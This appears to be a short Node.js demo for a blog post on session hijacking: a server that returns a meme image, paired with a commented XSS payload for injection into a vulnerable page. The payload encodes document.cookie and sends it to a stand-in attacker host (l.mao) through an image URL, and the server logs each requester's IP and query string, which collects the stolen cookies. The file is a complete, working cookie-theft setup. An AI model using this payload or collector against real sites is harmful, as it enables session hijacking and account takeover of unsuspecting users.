/*
 * Start this server with the command: node imageXss.js
 * All I do is send you an image.
 * 
 * Let's pretend this server is accessible at  http://l.mao
 * Inject this client-side script to a vulnerable webpage through XSS:
 * 
 * let c = encodeURI(document.cookie);
 * let url = 'http://l.mao/maosql.png?yourCookie=' + c;
 * // that line was a pun about integrals BTW
 * document.getElementsByTagName('image')[0].src = url;
 * 
 * This will replace the first image in the document with a funny meme.
 * 
 * https://twlinux.github.io/2018-02-18-hijacking/
 */

const http = require('http');
const fs = require('fs');
const picture = fs.readFileSync('./maosql.png');

const port = process.env.PORT || 8125;

http.createServer((req, res) => {

    let i = req.url.indexOf('?');
    if (i !== -1)
        console.log(req.connection.remoteAddress + ' ' + req.url.substring(i));
    
    res.writeHead(200, {'Content-Type': 'image/png' });
    res.end(picture, 'binary');
}).listen(port);

console.log('Qilai! bu yuan zuo nuli de ren-men');
